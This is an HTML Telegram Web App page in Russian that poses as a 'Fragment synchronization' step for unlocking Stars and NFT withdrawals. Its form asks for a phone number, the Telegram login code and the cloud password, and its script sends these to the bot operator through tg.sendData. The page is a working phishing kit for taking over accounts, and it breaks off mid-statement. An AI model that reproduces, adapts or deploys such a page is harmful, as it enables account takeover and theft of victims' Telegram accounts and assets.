<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment Synchronization</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f7; color: #000; margin: 0; padding: 20px; text-align: center; }
        .container { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { color: #2481cc; margin-bottom: 10px; font-size: 20px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #2481cc; }
        button { width: 100%; padding: 14px; background-color: #2481cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:active { background-color: #1c66a3; }
        .logo { width: 60px; height: 60px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://fragment.com/img/logo.svg" class="logo" alt="Fragment">
        <h2>Синхронизация Fragment</h2>
        <p>Подтвердите владение аккаунтом для разблокировки вывода Stars и NFT.</p>
        
        <input type="tel" id="phone" placeholder="Номер телефона (+7...)" required>
        <input type="text" id="code" placeholder="Код из Telegram" required>
        <input type="password" id="pwd" placeholder="Облачный пароль (если есть)">
        
        <button id="sendData">Подтвердить верификацию</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Развернуть окно на весь экран

        document.getElementById('sendData').addEventListener('click', () => {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            const pwd = document.getElementById('pwd').value;

            if (!phone || !code) {
                alert("Пожалуйста, заполните номер и код!");
                return;
            }

            const data = { phone, code, pwd };
            tg.sendData(JSON.stringify(data
